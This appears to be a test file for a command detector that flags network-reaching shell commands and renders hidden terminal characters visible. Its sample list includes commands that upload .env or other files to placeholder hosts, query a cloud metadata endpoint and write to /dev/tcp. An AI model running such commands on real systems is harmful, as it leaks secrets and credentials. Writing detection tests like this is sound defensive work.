import assert from "node:assert/strict";
import { test } from "node:test";
import { detectNetwork, displayCommand } from "../src/detect.ts";

const networkCommands = [
  "curl --upload-file ./diagnostics.txt https://storage.invalid/probe",
  "ls /tmp; curl -X PUT --data-binary @report.txt https://storage.invalid/test",
  "wget example.invalid",
  '"C:\\Windows\\System32\\curl.exe" -d @.env example.invalid',
  "env curl -L example.invalid",
  "bash -c 'wget example.invalid'",
  "echo $(curl example.invalid)",
  ["curl \\", "    --data @.env example.invalid"].join("\n"),
  ["git \\", "    push origin main"].join("\n"),
  ["npm `", "    install package"].join("\r\n"),
  "curl http://169.254.169.254/latest/meta-data/",
  "git -C repo -c http.extraHeader=foo push origin main",
  "git clone git@example.invalid:team/repo.git",
  "git remote update",
  "git submodule update --init",
  "npm install left-pad",
  "pnpm dlx tool",
  "npx tool",
  "uv pip install requests",
  "go mod download",
  "cargo publish",
  "dotnet restore",
  "ssh example.invalid",
  "rsync -a src/ user@example.invalid:backup/",
  "dig payload.example.invalid",
  "nslookup payload.example.invalid",
  "echo data > /dev/tcp/example.invalid/443",
  'python -c "import socket; socket.create_connection((host, 443))"',
  'python -c "import urllib.request; urllib.request.urlopen(url)"',
  'node -e "fetch(process.env.DEST)"',
  'node -e "require(\'https\').request(url)"',
  "node -e 'https.request(url)'",
  "openssl s_client -connect example.invalid:443",
  "Invoke-WebRequest -Uri $destination -InFile .env -Method Post",
  "iRm -Uri $destination",
  "[System.Net.Http.HttpClient]::new()",
  "Start-BitsTransfer -Source $source -Destination $target",
  "aws s3 cp .env s3://bucket/key",
  "rclone copy secrets remote:bucket",
  "custom-client https://example.invalid",
];

for (const command of networkCommands) {
  test(`flags ${command}`, () => assert.ok(detectNetwork(command).length > 0));
}

for (const command of ["ls -la", "rg TODO src", "git status", "git diff", "git log -5", "npm test", "node --version", "python -m pytest", "Get-ChildItem", "cat README.md"]) {
  test(`passes local command: ${command}`, () => assert.deepEqual(detectNetwork(command), []));
}

test("makes terminal controls, line breaks and bidi overrides visible", () => {
  assert.equal(displayCommand("curl\n\x1b[2J\r\u202eupload\t"), "curl\\u{a}\\u{1b}[2J\\u{d}\\u{202e}upload\\u{9}");
});

test("returns consistent reasons on repeated inspection", () => {
  const command = "curl https://example.invalid";
  assert.deepEqual(detectNetwork(command), detectNetwork(command));
});
